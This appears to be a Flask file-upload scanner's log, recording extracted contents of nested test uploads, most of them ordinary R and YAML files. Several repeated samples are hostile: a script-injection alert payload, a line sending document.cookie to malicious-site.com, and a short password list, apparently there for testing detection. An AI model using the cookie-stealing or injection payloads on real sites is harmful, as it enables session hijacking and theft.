from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:39:18,588 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:39:18,590 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:39:18,591 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:39:18,592 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,593 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,594 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,595 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:39:18,597 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,598 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,599 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/alpha.jpg: local variable 'file' referenced before assignment
2025-02-22 21:39:18,600 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:39:18,602 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:39:18,603 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:39:18,604 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:39:18,605 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,606 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,607 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,608 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:39:18,610 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,611 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,612 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/alpha.jpg: local variable 'file' referenced before assignment
2025-02-22 21:39:18,613 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:39:18,615 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:39:18,616 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:39:18,618 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:39:18,619 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,620 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,621 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,622 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:39:18,625 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,626 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,627 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/alpha.jpg: local variable 'file' referenced before assignment
2025-02-22 21:39:18,628 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,629 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,630 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,631 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,632 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,633 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,634 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,635 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,636 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,637 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,638 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,639 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,640 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,641 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,642 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,643 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,644 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,645 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,646 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,647 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,648 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,649 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,650 - Extracted content from uploads/test/test/45.xml: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,651 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,652 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,653 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,654 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,657 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 21:39:18,657 - [33mPress CTRL+C to quit[0m
2025-02-22 21:39:21,637 - 127.0.0.1 - - [22/Feb/2025 21:39:21] "GET / HTTP/1.1" 200 -
2025-02-22 21:39:25,770 - Error scanning uploads/output.jpg: local variable 'file' referenced before assignment
2025-02-22 21:39:25,774 - 127.0.0.1 - - [22/Feb/2025 21:39:25] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:39:25,777 - 127.0.0.1 - - [22/Feb/2025 21:39:25] "GET / HTTP/1.1" 200 -
2025-02-22 21:39:34,166 - Error scanning uploads/output.jpg: local variable 'file' referenced before assignment
2025-02-22 21:39:34,169 - 127.0.0.1 - - [22/Feb/2025 21:39:34] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:39:34,172 - 127.0.0.1 - - [22/Feb/2025 21:39:34] "GET / HTTP/1.1" 200 -
2025-02-22 21:40:33,179 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:40:33,182 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:40:33,183 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:40:33,185 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:40:33,186 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,187 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,188 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,189 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:40:33,191 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,192 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,194 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:40:33,196 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:40:33,197 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:40:33,199 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:40:33,201 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,202 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,203 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,204 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:40:33,207 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:40:33,208 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,210 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:40:33,212 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:40:33,214 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:40:33,216 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:40:33,218 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:40:33,220 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:40:33,222 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:40:33,224 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:40:33,228 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

